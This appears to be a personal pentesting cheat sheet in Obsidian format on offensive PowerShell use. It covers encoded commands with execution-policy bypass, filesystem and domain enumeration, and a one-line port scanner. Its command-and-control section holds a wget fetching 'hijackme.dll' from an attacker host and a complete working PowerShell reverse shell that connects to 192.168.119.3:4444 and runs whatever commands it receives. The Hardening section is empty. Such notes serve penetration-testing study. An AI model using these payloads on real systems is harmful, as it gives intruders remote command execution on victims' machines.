---
tags:
  - "#type/tech-specific"
  - "#attack/reconnaissance/active"
  - "#attack/discovery"
  - "#attack/command-and-control"
---
# Fundamentals
Can directly execute encoded commands

check if you are running PowerShell or cmd: [[2 Tech-Specifics/Web/WebApp Attacks/Injection Attacks/Command Injection#Get environment info|Get environment Info]]
## Usage
`-enc <base64string>` - execute base64 encoded command
- **Hint:** When encoding a commant with [[3 Tools/utilities/Cyberchef|Cyberchef]], you first need to apply "Encode Text" to encode the input to "UTF-16LE" (this is “Unicode” in .NET) - then apply the base64 encoding. [Cyberchef Recipe](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200%29'%29To_Base64('A-Za-z0-9%2B/%3D'%29)
`-nop` - dont run customiztions of the user profile
`-exec bypass` - bypass execution policies
`-c`- execute string as command"
# Pentesting
## Enumeration
#### Search the Filesystem
```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "myfile.txt" 
```
**Hint:** use `*` as a wildcard
#### Print the current Domain
```powershell
(Get-CimInstance Win32_ComputerSystem).Domain
```
 or 
```powershell
$env:USERDOMAIN
```
## Discovery
#### Perform TCP Port Scan
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```
#### test connection on one tcp port
```powershell
Test-NetConnection -Port 445 192.168.50.151
```
## Command and Control
#### download file 
```powershell
wget -O hijackme.dll IP:PORT/hijackme.dll
```
#### Reverse Shell Payloads
powershell reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Alternatively: use [[3 Tools/shells/powercat|powercat]] to gain a reverse shell
# Hardening